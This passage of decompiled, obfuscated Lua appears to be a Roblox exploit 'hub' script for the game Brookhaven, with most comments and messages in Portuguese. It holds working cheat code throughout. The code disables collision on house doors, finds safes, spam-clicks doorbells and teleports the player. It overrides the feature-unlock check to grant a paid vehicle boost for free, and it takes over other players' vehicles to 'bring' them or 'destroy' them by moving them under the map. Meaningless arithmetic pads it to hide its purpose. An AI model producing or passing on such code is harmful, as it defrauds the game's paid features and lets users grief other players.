	upv3:WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(tbl))
	print("Equipado:", upv4[arg], "→", v)
end

-- payload closure created 384-th (proto #252)
local function payload_fn_384(arg)
	upv1[upv2] = tonumber(arg) or arg
end

-- payload closure created 385-th (proto #253)
local function payload_fn_385()
	upv1(upv2)
end

-- payload closure created 386-th (proto #262)
local function payload_fn_386()
	local n001Lots = upv1:FindFirstChild("001_Lots")
	return n001Lots and upv2 and n001Lots:FindFirstChild(tostring(upv2))
end

-- payload closure created 387-th (proto #263)
local function payload_fn_387(arg)
	arg = arg and arg:FindFirstChild("HousePickedByPlayer")
	return arg and arg:FindFirstChild("HouseModel")
end

-- payload closure created 388-th (proto #265)
local function payload_fn_388(arg)
	if not arg then
		return nil
	end

	if arg:IsA("BasePart") then
		return arg.Position
	end

	if arg:IsA("Model") then
		return arg:GetPivot().Position
	end
	local basePart = arg:FindFirstChildWhichIsA("BasePart", true)
	return basePart and basePart.Position or nil
end

-- payload closure created 389-th (proto #266)
local function payload_fn_389()
	local character = upv1.Character
	return character and character:FindFirstChild("HumanoidRootPart")
end

-- payload closure created 390-th (proto #t4658)
local function payload_fn_390(arg, arg2)
	local v = upv1()
	return v and arg and (v.Position - arg).Magnitude <= arg2
end

-- payload closure created 391-th (proto #t2680)
local function payload_fn_391(arg, arg2)
	if not arg:IsA("BasePart") then
		return false
	end

	while arg and arg ~= arg2 do
		local v = string.lower(arg.Name)
		if v == "001_housedoors" or v:find("housedoor", 1, true) or v:find("nolockhousedoor", 1, true) or v:find("fencedoor", 1, true) or v:find("garagedoor", 1, true) then
			return true
		end
		arg = arg.Parent
	end

	return false
end

-- payload closure created 392-th (proto #t2671)
local function payload_fn_392(arg, arg2)
	if not arg then
		return
	end

	for _, descendant in ipairs(arg:GetDescendants()) do
		if upv1(descendant, arg) then
			if arg2 then
				if upv2[descendant] == nil then
					upv2[descendant] = descendant.CanCollide
				end

				descendant.CanCollide = false
			elseif upv2[descendant] ~= nil then
				descendant.CanCollide = upv2[descendant]
				upv2[descendant] = nil
			end
		end
	end
end

-- payload closure created 393-th (proto #259)
local function payload_fn_393()
	for k, v in pairs(upv1) do
		if k and k.Parent then
			k.CanCollide = v
		end

		upv1[k] = nil
	end
end

-- payload closure created 394-th (proto #264)
local function payload_fn_394(arg)
	if not arg then
		return nil
	end
	local n001Safe = arg:FindFirstChild("001_Safe", true)
	if n001Safe then
		return n001Safe
	end

	for _, descendant in ipairs(arg:GetDescendants()) do
		if string.lower(descendant.Name):find("safe", 1, true) and not string.lower(descendant.Name):find("fake", 1, true) then
			return descendant
		end
	end

	return nil
end

-- payload closure created 395-th (proto #273)
local function payload_fn_395(arg, arg2)
	arg = arg and arg.Parent

	while arg and arg ~= arg2 do
		if arg:IsA("BasePart") then
			return arg.Position
		end
		arg = arg.Parent
	end

	return upv1(arg2)
end

-- payload closure created 396-th (proto #272)
local function payload_fn_396(arg)
	if not arg then
		return nil
	end
	local v = upv1()
	local v2 = nil
	local v3 = nil
	local v4 = nil
	local v5 = nil

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("ClickDetector") then
			local parent = descendant.Parent
			local flag = false
			local flag2 = false

			while parent and parent ~= arg do
				local v6 = string.lower(parent.Name)

				if v6:find("knock", 1, true) then
					flag = true
				end

				if v6 == "001_doorbell" or v6 == "doorbell" then
					flag2 = true
				end

				parent = parent.Parent
			end

			local v6 = upv2(descendant, arg)
			local magnitude = v and v6 and (v.Position - v6).Magnitude

			if flag and magnitude and (not v2 or magnitude < v2) then
				v2 = magnitude
				v3 = descendant
			elseif flag2 and magnitude and (not v4 or magnitude < v4) then
				v4 = magnitude
				v5 = descendant
			end
		end
	end

	return v3 or v5
end

-- payload closure created 397-th (proto #256)
local function payload_fn_397()
	for _, descendant in ipairs(upv1:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.Name:match("^BannedBlock%d*$") then
			descendant:Destroy()
		end
	end
end

-- payload closure created 398-th (proto #255)
local function payload_fn_398()
	upv1()
end

-- payload closure created 399-th (proto #257)
local function payload_fn_399()
	local tbl = {}
	local n001Lots = upv1:FindFirstChild("001_Lots")

	if n001Lots then
		for _, child in ipairs(n001Lots:GetChildren()) do
			if child:IsA("Model") and child.Name ~= "For Sale" then
				table.insert(tbl, child.Name)
			end
		end
	end

	return tbl
end

-- payload closure created 400-th (proto #258)
local function payload_fn_400(arg)
	upv1()
	upv2 = arg

	if upv3 then
		upv3:Set(false)
	end
end

-- payload closure created 401-th (proto #260)
local function payload_fn_401()
	local v = upv1()

	if upv2 and upv2.Set then
		upv2:Set(v)
	end
end

-- payload closure created 402-th (proto #261)
local function payload_fn_402()
	local v = upv1()
	local v2 = upv2(v)
	local v3 = upv3(v2)
	local v4 = upv4(v3)
	local v5 = upv5()

	if v5 and v4 and upv6(upv4(v), 180) then
		v5.CFrame = CFrame.new(v4 + Vector3.new(0, 3, 0))
	end
end

-- payload closure created 403-th (proto #267)
local function payload_fn_403()
	if not upv1 then
		return
	end
	local humanoidRootPart = upv2.Character and upv2.Character:FindFirstChild("HumanoidRootPart")
	local n001Lots = upv3:FindFirstChild("001_Lots")
	n001Lots = n001Lots and n001Lots:FindFirstChild(upv1)
	n001Lots = n001Lots and n001Lots:FindFirstChild("BuyHouse")

	if humanoidRootPart and n001Lots and n001Lots:IsA("BasePart") then
		humanoidRootPart.CFrame = CFrame.new(n001Lots.Position + upv4)
	end
end

-- payload closure created 404-th (proto #268)
local function payload_fn_404(arg)
	local flag = type(0) == "vector"
	local n2 = 555116843
	upv1 += 1
	local v = upv1
	if not arg then
		upv2()
		return
	end
	local n3 = n2 - 165704352

	task.spawn(function()
		while v == upv1 do
			local v2 = upv3()
			local v3 = upv4(v2)

			if v3 then
				upv5(v3, true)
			end

			task.wait(0.5)
		end
	end)
end

-- payload closure created 406-th (proto #270)
local function payload_fn_406(loopBater)
	getgenv().LoopBater = loopBater
	local n2 = 219641073
	if not loopBater then
		return
	end

	task.spawn(function()
		while getgenv().LoopBater do
			local v = upv1()
			local v2 = upv2(v)
			local v3 = upv3(v2)
			local v4 = upv4(v3, v2)

			if v3 and upv5(v4, 35) and fireclickdetector then
				pcall(fireclickdetector, v3)
			end

			task.wait(0.5)
		end
	end)
end

-- payload closure created 408-th (proto #276)
local function payload_fn_408()
	local vehicles = upv1:FindFirstChild("Vehicles")
	if not vehicles then
		return nil
	end
	local v = vehicles:FindFirstChild(upv2.Name .. "Car")
	if not v then
		return nil
	end
	local seats = v:FindFirstChild("Seats")
	if not seats then
		return nil
	end
	return seats:FindFirstChild("VehicleSeat")
end

-- payload closure created 409-th (proto #274)
local function payload_fn_409(arg)
	upv1 = arg
end

-- payload closure created 410-th (proto #275)
local function payload_fn_410()
	local v = upv1()
	if not v then
		upv2:SetCore("SendNotification", { Title = "Aviso", Text = "Seu carro nao foi encontrado no mapa." })
		return
	end
	local value = tonumber(upv3)
	if not value then
		upv2:SetCore("SendNotification", { Title = "Erro", Text = "Valor de velocidade invalido." })
		return
	end
	local maxSpeed = v:FindFirstChild("MaxSpeed")

	if maxSpeed and maxSpeed:IsA("NumberValue") then
		maxSpeed.Value = value
		upv2:SetCore("SendNotification", { Title = "Sucesso", Text = "Velocidade alterada para " .. value })
	else
		upv2:SetCore("SendNotification", { Title = "Erro", Text = "Propriedade MaxSpeed ausente." })
	end
end

-- payload closure created 411-th (proto #277)
local function payload_fn_411(arg)
	upv1 = arg
end

-- payload closure created 412-th (proto #278)
local function payload_fn_412()
	local v = upv1()
	if not v then
		upv2:SetCore("SendNotification", { Title = "Aviso", Text = "Seu carro nao foi encontrado no mapa." })
		return
	end
	local turbo = v:FindFirstChild("Turbo")

	if turbo and turbo:IsA("StringValue") then
		turbo.Value = tostring(upv3)
		upv2:SetCore("SendNotification", { Title = "Sucesso", Text = "Turbo alterado para " .. turbo.Value })
	else
		upv2:SetCore("SendNotification", { Title = "Erro", Text = "Propriedade Turbo ausente." })
	end
end

-- payload closure created 413-th (proto #279)
local function payload_fn_413()
	while task.wait(0.2) do
		local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")

		if humanoid and humanoid.SeatPart and humanoid.SeatPart:IsA("VehicleSeat") and upv2 then
			if upv3.Gravity ~= upv4 then
				upv3.Gravity = upv4
			end
		else
			local coquettePlayerGravity = _G.CoquettePlayerGravity or 196.2

			if upv3.Gravity ~= coquettePlayerGravity then
				upv3.Gravity = coquettePlayerGravity
			end
		end
	end
end

-- payload closure created 414-th (proto #280)
local function payload_fn_414(arg)
	upv1 = arg
end

-- payload closure created 415-th (proto #281)
local function payload_fn_415()
	local num = tonumber(upv1)
	if not num then
		upv2:SetCore("SendNotification", { Title = "Erro", Text = "Valor de gravidade invalido." })
		return
	end
	upv3 = num
	upv4 = true
	upv2:SetCore("SendNotification", { Title = "Sucesso", Text = "Aderencia " .. num .. " sera aplicada ao dirigir." })
end

-- payload closure created 416-th (proto #282)
local function payload_fn_416(arg)
	upv1 = arg

	if arg then
		local n2 = 4544424552

		task.spawn(function()

			while upv1 do
				local v = upv2()

				if v then
					if v.CFrame.UpVector.Y < 0.2 then
						local parent = v.Parent

						while parent and not parent:IsA("Model") do
							parent = parent.Parent
						end

						if parent then
							local raycastParams = RaycastParams.new()
							raycastParams.FilterType = Enum.RaycastFilterType.Exclude
							raycastParams.FilterDescendantsInstances = { parent, upv3.Character }

							if upv4:Raycast(v.Position, Vector3.new(0, -15, 0), raycastParams) then
								local primaryPart = parent.PrimaryPart or v
								local v2, v3 = primaryPart.CFrame:ToOrientation()
								local cFrame = CFrame.new(primaryPart.Position + Vector3.new(0, 2, 0)) * CFrame.Angles(0, v3, 0)
								primaryPart.CFrame = cFrame
								v.CFrame = cFrame
								primaryPart.AssemblyAngularVelocity = Vector3.zero
								primaryPart.AssemblyLinearVelocity = Vector3.zero
							end
						end
					end
				end

				task.wait(0.5)
			end
		end)
	end
end

-- payload closure created 418-th (proto #284)
local function payload_fn_418(arg)
	local n2 = 930442158
	local n3 = 2232249692

	if arg then
		if not upv1 then
			local n4 = 377767917
			upv1 = Instance.new("ScreenGui")
			upv1.Name = "CoquetteFreioGui"
			upv1.ResetOnSpawn = false

			pcall(function()
				local CoreGui = game:GetService("CoreGui")

				if CoreGui then
					upv1.Parent = CoreGui
				else
					upv1.Parent = upv2:WaitForChild("PlayerGui")
				end
			end)

			local str = "CoquetteHubcarpng/FreioAviao.png"
			local image = ""
			local flag = type(isfolder) == "function"

			if flag then
				local kind = type(makefolder)
				local v = table.pack(bit32.band(n3, 4294967295))
				local v2 = table.pack(bit32.band(n2, 4294967295))
				local v3 = table.pack(bit32.band(v[1], 65535))
				local v4 = table.pack(bit32.rshift(v[1], 16))
				local v5 = table.pack(bit32.band(v2[1], 65535))
				flag = kind == "function"
				n3 = bit32.band(v3[1] * v5[1] + bit32.lshift(bit32.band(v3[1] * bit32.rshift(v2[1], 16) + v4[1] * v5[1], 65535), 16), 4294967295) + 3123422420
			end

			if flag and type(isfile) == "function" and type(writefile) == "function" and type(getcustomasset) == "function" then
				local n5 = 567528011

				pcall(function()
					if not isfolder("CoquetteHubcarpng") then
						makefolder("CoquetteHubcarpng")
					end

					if not isfile(str) then
						local response = game:HttpGet("https://iili.io/BLxmfsV.png")
						writefile(str, response)
					end

					image = getcustomasset(str)
				end)
			end

			local imageButton = Instance.new("ImageButton")
			imageButton.Size = UDim2.new(0, 90, 0, 90)
			imageButton.Position = UDim2.new(0.5, -45, 0.75, 0)
			imageButton.BackgroundTransparency = 1
			imageButton.Image = image
			local v = bit32.bor(n3, 1983320794)
			Instance.new("UICorner", imageButton).CornerRadius = UDim.new(1, 0)
			local uiStroke = Instance.new("UIStroke", imageButton)
			uiStroke.Thickness = 3
			uiStroke.Color = Color3.fromRGB(255, 255, 255)
			local n5 = n4 + 519994802 - 211440193
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			local flag2 = nil
			local position = nil
			local position2 = nil

			imageButton.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					bit32.bxor(bit32.bxor(n5, 0), 220119832)
					flag2 = true
					position = input.Position
					local n6 = 416142992
					position2 = imageButton.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							flag2 = false
						end
					end)
				end
			end)

			game:GetService("UserInputService").InputChanged:Connect(function(input)
				local flag3 = flag2

				if flag2 then
					flag3 = input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch
				end

				if flag3 then
					local n6 = input.Position - position
					imageButton.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n6.X, position2.Y.Scale, position2.Y.Offset + n6.Y)
				end
			end)

			imageButton.MouseButton1Click:Connect(function()
				local v2 = upv3()

				if v2 then
					local n6 = 341157474
					local n7 = bit32.bxor(n5, 0) + 494376960
					local parent = v2.Parent

					while parent and not parent:IsA("Model") do
						parent = parent.Parent
					end

					local primaryPart = parent and parent.PrimaryPart or v2
					local v3 = task
					local v4 = table.pack(bit32.band(n6, 4294967295))
					local v5 = table.pack(bit32.band(v4[1], 65535))
					local n8 = bit32.band(32587 * v5[1] + bit32.lshift(bit32.band(32587 * bit32.rshift(v4[1], 16) + 12353 * v5[1], 65535), 16), 4294967295) + 1971128501
					local v6 = table.pack(bit32.band(bit32.bor(n6, 171874303), 4294967295))
					local v7 = table.pack(bit32.band(v6[1], 65535))
					local v8 = bit32.band(32950 * v7[1] + bit32.lshift(bit32.band(32950 * bit32.rshift(v6[1], 16) + 53182 * v7[1], 65535), 16), 4294967295)
					local v9 = table.pack(bit32.band(bit32.band(n6, 171874303), 4294967295))
					local v10 = table.pack(bit32.band(v9[1], 65535))
					local spawn = v3.spawn
					local v11 = bit32.bxor(n8 + v8 + bit32.band(32948 * v10[1] + bit32.lshift(bit32.band(32948 * bit32.rshift(v9[1], 16) + 53182 * v10[1], 65535), 16), 4294967295), 509016062)

					spawn(function()
						local n9 = tick() + 0.5

						while tick() < n9 do
							v2.AssemblyLinearVelocity = Vector3.zero
							v2.AssemblyAngularVelocity = Vector3.zero

							if primaryPart then
								primaryPart.AssemblyLinearVelocity = Vector3.zero
								primaryPart.AssemblyAngularVelocity = Vector3.zero
							end

							task.wait()
						end
					end)
				end
			end)

			imageButton.Parent = upv1
		end

		upv1.Enabled = true
	elseif upv1 then
		upv1.Enabled = false
	end
end

-- payload closure created 428-th (proto #289)
local function payload_fn_428()
	upv1("Sled", "Gamepass", "SkateBoardAnimation", false)
end

-- payload closure created 433-th (proto #295)
local function payload_fn_433()
	upv1("Summer2026BigWheel", "Gamepass", "BigWheelAnimation", true)
end

-- payload closure created 434-th (proto #296)
local function payload_fn_434()
	upv1("CarrotPogoStick", "Gamepass", nil, false)
end

-- payload closure created 435-th (proto #297)
local function payload_fn_435()
	upv1("BlueScooter", "Gamepass", "ScooterAnimation", false)
end

-- payload closure created 436-th (proto #298)
local function payload_fn_436()
	upv1("PinkScooter", "Gamepass", "ScooterAnimation", false)
end

-- payload closure created 437-th (proto #299)
local function payload_fn_437()
	upv1("Unicycle", "Small", "UnicycleAnimation", true)
end

-- payload closure created 438-th (proto #300)
local function payload_fn_438()
	upv1(1)
end

-- payload closure created 439-th (proto #302)
local function payload_fn_439()
	upv1(2)
end

-- payload closure created 440-th (proto #303)
local function payload_fn_440()
	upv1(3)
end

-- payload closure created 441-th (proto #304)
local function payload_fn_441()
	upv1(0)
end

-- payload closure created 442-th (proto #305)
local function payload_fn_442()
	local n2 = 429781486
	local n3 = 1060898127
	local n4 = 3686906509
	local n5 = 2340068136
	local genv = getgenv() or _G

	if type(genv.__BrookhavenCarBoostCleanup) == "function" then
		pcall(genv.__BrookhavenCarBoostCleanup)
	end

	local Players = game:GetService("Players")
	local CollectionService = game:GetService("CollectionService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
	local VehicleController = require(ReplicatedStorage.Modules.Client.Vehicles.VehicleController)
	local UnlockableController = require(ReplicatedStorage.Modules.Client.PlayerData.UnlockableController)
	local AdFeatures = require(ReplicatedStorage.Modules.Shared.Advertisements.AdFeatures)
	require(ReplicatedStorage.Modules.Shared.PlayerData.Gamepasses)
	local id = AdFeatures.VEHICLE_BOOST.id
	local isFeatureUnlocked = UnlockableController.IsFeatureUnlocked
	local flag = false

	local function fn()
		local n6 = 511605714
		if flag then
			return
		end
		flag = true
		local v = table.pack(bit32.band(n6, 4294967295))
		local v2 = table.pack(bit32.band(v[1], 65535))
		local n7 = bit32.band(62250 * v2[1] + bit32.lshift(bit32.band(62250 * bit32.rshift(v[1], 16) + 16907 * v2[1], 65535), 16), 4294967295) + 4037459226
		local v3 = table.pack(bit32.band(bit32.bor(n6, 297550617), 4294967295))
		local v4 = table.pack(bit32.band(v3[1], 65535))
		local v5 = bit32.band(6572 * v4[1] + bit32.lshift(bit32.band(6572 * bit32.rshift(v3[1], 16) + 31720 * v4[1], 65535), 16), 4294967295)
		local v6 = table.pack(bit32.band(bit32.bxor(n6, 297550617), 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local n8 = n7 + v5 + bit32.band(62251 * v7[1] + bit32.lshift(bit32.band(62251 * bit32.rshift(v6[1], 16) + 16907 * v7[1], 65535), 16), 4294967295)

		UnlockableController.IsFeatureUnlocked = function(arg, arg2)
			if arg == id then
				return true
			end
			return isFeatureUnlocked(arg, arg2)
		end
	end

	fn()
	local v = nil
	local tbl = {}
	local n6 = n2 + 102203052 + 312229480
	local tbl2 = {}
	local flag2 = false
	local n7 = 0

	local function fn2()
		local vehicleBoost = playerGui:FindFirstChild("VehicleBoost") or playerGui:FindFirstChild("VehicleBoost", true)
		if vehicleBoost then
			return vehicleBoost:FindFirstChild("BoostButton") or vehicleBoost:FindFirstChild("BoostButton", true)
		end
		return nil
	end

	local function fn3()
		if not flag2 then
			return
		end
		flag2 = false
		local v2 = fn2()

		if v2 and getconnections then
			local ok2, result2 = pcall(getconnections, v2.MouseButton1Up)

			if ok2 and type(result2) == "table" then
				for _, v3 in ipairs(result2) do
					pcall(v3.Function)
				end
			end
		end

		pcall(VehicleController.SetBoost, false)
	end

	local function fn4()
		if flag2 then
			return
		end
		flag2 = true
		local v2 = fn2()

		if v2 and getconnections then
			local ok2, result2 = pcall(getconnections, v2.MouseButton1Down)

			if ok2 and type(result2) == "table" then
				for _, v3 in ipairs(result2) do
					pcall(v3.Function)
				end
			end
		end
	end


	local function fn5()
		local now = os.clock()
		if now - n7 < 0.08 then
			return
		end
		n7 = now
		fn4()
	end

	local function fn6()
		fn3()
	end

	local function fn7()
		for _, v2 in ipairs(tbl) do
			local flag3 = type(219462803) == "userdata"
			local n8 = 8593530133

			pcall(function()
				v2:Disconnect()
			end)
		end

		tbl = {}
	end

	local function fn8()
		local n8 = 1843774365
		local n9 = 581698132
		local v2 = bit32.bxor(n6, 1989798330)
		local n10 = 3343648348
		fn7()
		flag2 = false

		if v then
			pcall(function()
				v:Destroy()
			end)

			v = nil
		end

		task.wait(0.3)
		fn()
		local v3 = pcall

		local function fn9()
			return playerGui.MainGUIHandler.VehicleControl.CarButtons.CarButtonsBottom
		end

		local v4, v5 = v3(fn9)
		if not v4 or not v5 then
			return
		end
		local vehicleBoostButton = v5:FindFirstChild("VehicleBoostButton")
		if not vehicleBoostButton then
			return
		end
		local freeBoostButton = v5:FindFirstChild("FreeBoostButton")

		if freeBoostButton then
			freeBoostButton:Destroy()
		end

		local clone = vehicleBoostButton:Clone()
		clone.Name = "FreeBoostButton"
		v = clone

		for _, v6 in ipairs(CollectionService:GetTags(clone)) do
			CollectionService:RemoveTag(clone, v6)
		end

		local letter = clone:FindFirstChild("Letter")

		if letter then
			letter.Text = "FREE"
			letter.AutoLocalize = false
		end

		clone.Parent = v5
		table.insert(tbl, clone.MouseButton1Down:Connect(fn5))
		table.insert(tbl, clone.MouseButton1Up:Connect(fn6))

		table.insert(tbl, clone.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch then
				fn5()
			end
		end))

		table.insert(tbl, clone.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch then
				fn6()
			end
		end))

		local insert = table.insert
		local v6 = tbl

		insert(v6, clone.AncestryChanged:Connect(function()
			if not clone:IsDescendantOf(playerGui) then
				fn3()
			end
		end))
	end

	local v2 = table

	v2.insert(tbl2, VehicleController.OnPlayerStoppedDriving:Connect(function()
		fn3()
		fn7()

		if v then
			local n8 = 4709457641

			pcall(function()
				v:Destroy()
			end)

			v = nil
		end
	end))

	table.insert(tbl2, VehicleController.OnPlayerStartedDriving:Connect(function()
		local flag3 = type(287647782) == "function"
		local n8 = 4605767241

		task.spawn(function()
			task.wait(0.5)
			fn()
			fn8()
		end)
	end))

	pcall(VehicleController.SetBoost, false)

	if VehicleController.IsPlayerDriving() then
		task.spawn(fn8)
	end

	genv.__BrookhavenCarBoostCleanup = function()
		fn3()
		fn7()

		for _, v3 in ipairs(tbl2) do
			local n8 = 603930343

			pcall(function()
				v3:Disconnect()
			end)
		end

		tbl2 = {}

		if v then
			local n8 = 463729364

			pcall(function()
				v:Destroy()
			end)

			v = nil
		end
	end
end

-- payload closure created 454-th (proto #313)
local function payload_fn_454(arg, arg2)
	local n2 = 8609601625

	pcall(function()
		upv1:SetCore("SendNotification", { Title = arg, Text = arg2, Duration = 5 })
	end)
end

-- payload closure created 455-th (proto #t946)
local function payload_fn_455(arg)
	if not (arg and arg:IsA("Model")) then
		return nil
	end
	local seats = arg:FindFirstChild("Seats")

	if seats then
		local vehicleSeat = seats:FindFirstChild("VehicleSeat") or seats:FindFirstChildOfClass("VehicleSeat", true)
		if vehicleSeat then
			return vehicleSeat
		end
	end

	local body = arg:FindFirstChild("Body")

	if body then
		local vehicleSeat = body:FindFirstChild("VehicleSeat") or body:FindFirstChildOfClass("VehicleSeat", true)
		if vehicleSeat then
			return vehicleSeat
		end
	end

	return arg:FindFirstChildOfClass("VehicleSeat", true) or arg:FindFirstChild("VehicleSeat", true)
end

-- payload closure created 456-th (proto #t5315)
local function payload_fn_456(arg, cFrame)
	local n2 = 238441474
	local flag = type(0) == "userdata"
	local isModel = arg and arg:IsA("Model")
	local v = bit32.bxor(n2, 181559419)
	if not isModel then
		return
	end
	local v2 = pcall
	local v3 = table.pack(bit32.band(v, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(46192 * v4[1] + bit32.lshift(bit32.band(46192 * bit32.rshift(v3[1], 16) + 2006 * v4[1], 65535), 16), 4294967295) + 4000249168
	local v5 = table.pack(bit32.band(bit32.bor(v, 504342147), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(38688 * v6[1] + bit32.lshift(bit32.band(38688 * bit32.rshift(v5[1], 16) + 61522 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(v, 504342147), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(46193 * v9[1] + bit32.lshift(bit32.band(46193 * bit32.rshift(v8[1], 16) + 2006 * v9[1], 65535), 16), 4294967295)

	v2(function()
		arg:PivotTo(cFrame)
		local v10 = upv1(arg)

		if v10 then
			v10.CFrame = cFrame
			v10.AssemblyLinearVelocity = Vector3.zero
			v10.AssemblyAngularVelocity = Vector3.zero
		end
	end)
end

-- payload closure created 457-th (proto #763)
local function payload_fn_457(arg)
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end
	humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, arg)
	humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, arg)
	upv2 = not arg
end

-- payload closure created 458-th (proto #t694)
local function payload_fn_458(arg)
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = humanoid and upv1.Character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return false
	end
	humanoid.Sit = false
	task.wait(0.1)
	local n2 = 0

	while humanoid.SeatPart ~= arg and n2 < 20 do
		humanoidRootPart.CFrame = arg.CFrame * CFrame.new(0, 1.5, 0)
		arg:Sit(humanoid)
		task.wait(0.1)
		n2 += 1
	end

	return humanoid.SeatPart == arg
end

-- payload closure created 459-th (proto #t2644)
local function payload_fn_459(arg, arg2)
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
		humanoid.Sit = false
	end

	task.wait(arg2 or 0.2)

	if arg and upv1.Character then
		local n2 = 419262320

		pcall(function()
			upv1.Character:PivotTo(CFrame.new(arg))
		end)
	end

	if humanoid then
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
	end
end

-- payload closure created 460-th (proto #308)
local function payload_fn_460()
	local tbl = {}
	local vehicles = upv1:FindFirstChild("Vehicles")

	if vehicles then
		for _, child in ipairs(vehicles:GetChildren()) do
			if child.Name:match("Car$") then
				table.insert(tbl, child.Name)
			end
		end
	end

	table.sort(tbl)
	return #tbl > 0 and tbl or { "Nenhum carro detectado" }
end

-- payload closure created 461-th (proto #t3942)
local function payload_fn_461(arg, arg2)
	local n2 = 2619765756
	local n3 = 3376279744
	local v = upv1(arg)
	local v2 = n3
	if not v then
		upv2("Erro", "Assento do veículo inválido.")
		return
	end

	if v.Occupant then
		upv2("Aviso", "Assento ocupado! Ação não concluída.")
		return
	end
	local position = upv3.Character and upv3.Character.PrimaryPart and upv3.Character.PrimaryPart.Position
	if not position then
		return
	end
	upv4(false)

	if upv5(v) then
		if arg2 == "destroy" then
			local cframe = CFrame.new(-72.160675, -265.912933, 185.448303, -0.954315305, -0.0284829754, -0.297440737, -1.45693075e-08, 0.995446265, -0.0953240618, 0.298801392, -0.0909692124, -0.949969649)
			upv6(arg, cframe)
			local v3 = task
			local v4 = table.pack(bit32.band(n3, 4294967295))
			local v5 = table.pack(bit32.band(v2, 4294967295))
			local v6 = table.pack(bit32.band(v4[1], 65535))
			local v7 = table.pack(bit32.rshift(v4[1], 16))
			local v8 = table.pack(bit32.band(v5[1], 65535))
			local v9 = bit32.band(v6[1] * v8[1] + bit32.lshift(bit32.band(v6[1] * bit32.rshift(v5[1], 16) + v7[1] * v8[1], 65535), 16), 4294967295)
			v3.wait(0.1)
			upv2("Sucesso", "Veículo destruído com sucesso.")
			upv7(position, 0.6)
			n3 = v9 - 1420468032
		elseif arg2 == "bring" then
			upv6(arg, CFrame.new(position + Vector3.new(0, 3, 5)))
			task.wait(0.1)
			upv2("Sucesso", "Veículo trazido ate sua posicao.")
			upv7(position, 0.6)
		end
	else
		upv2("Erro", "Falha ao assumir controle do veículo.")
		upv7(position, 0.2)
	end

	local v3 = upv4
	v3(true)
end

-- payload closure created 462-th (proto #311)
local function payload_fn_462()
	if upv1 and upv1.Set then
		upv1:Set(upv2())
	end
end

-- payload closure created 463-th (proto #309)
local function payload_fn_463(arg)
	if arg and type(arg) == "string" and not arg:find("Nenhum carro") then
		upv1 = arg
	else
		upv1 = nil
	end
end

-- payload closure created 464-th (proto #310)
local function payload_fn_464()
	upv1()
end

-- payload closure created 465-th (proto #312)
local function payload_fn_465()
	local n2 = 2751426681
	local n3 = 1254541996
	local n4 = 3745937693
	if not upv1 then
		upv2("Aviso", "Selecione um veículo na lista primeiro.")
		return
	end
	local v = upv3.Vehicles:FindFirstChild(upv1)

	if not v then
		local v2 = upv2
		v2("Erro", "Veículo alvo não foi encontrado no mapa.")
		return
	end

	local v2 = upv4(v)
	if not v2 then
		return
	end

	if v2.Occupant then
		upv2("Aviso", "O assento do motorista ja esta ocupado.")
		return
	end
	local character = upv5.Character
	local v3 = bit32.bor(n3, 817927972)
	character = character and upv5.Character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = upv5.Character and upv5.Character:FindFirstChild("HumanoidRootPart")

	if character and humanoidRootPart then
		character.Sit = false
		task.wait(0.1)
		humanoidRootPart.CFrame = v2.CFrame * CFrame.new(0, 2, 0)
		task.wait(0.1)
		v2:Sit(character)
		upv2("Sucesso", "Você entrou no banco do motorista.")
	end
end

-- payload closure created 467-th (proto #315)
local function payload_fn_467()
	local n2 = 3543118237
	local n3 = 4016241349
	if not upv1 then
		upv2("Aviso", "Selecione um veículo na lista primeiro.")
		return
	end
	local v = upv3.Vehicles:FindFirstChild(upv1)
	local n4 = n2 + 430509721
	if not v then
		upv2("Erro", "Veículo alvo não foi encontrado no mapa.")
		return
	end
	local seats = v:FindFirstChild("Seats") or v
	local v2 = nil

	for _, descendant in ipairs(seats:GetDescendants()) do
		if descendant:IsA("Seat") and not descendant:IsA("VehicleSeat") then
			if not descendant.Occupant then
				v2 = descendant
				break
			else
				v2 = nil
			end
		else
			v2 = nil
		end
	end

	if v2 then
		local humanoid = upv4.Character and upv4.Character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = upv4.Character and upv4.Character:FindFirstChild("HumanoidRootPart")

		if humanoid and humanoidRootPart then
			humanoid.Sit = false
			task.wait(0.1)
			local cFrame = v2.CFrame * CFrame.new(0, 2, 0)
			local v3 = bit32.band(n3, n4)
			humanoidRootPart.CFrame = cFrame
			task.wait(0.1)
			v2:Sit(humanoid)
			upv2("Sucesso", "Voce entrou como passageiro.")
		end
	else
		upv2("Aviso", "O carro nao possui assento disponível ou ja esta ocupado.")
	end
end

-- payload closure created 468-th (proto #316)
local function payload_fn_468()
	if not upv1 then
		upv2("Aviso", "Selecione um veiculo primeiro.")
		return
	end
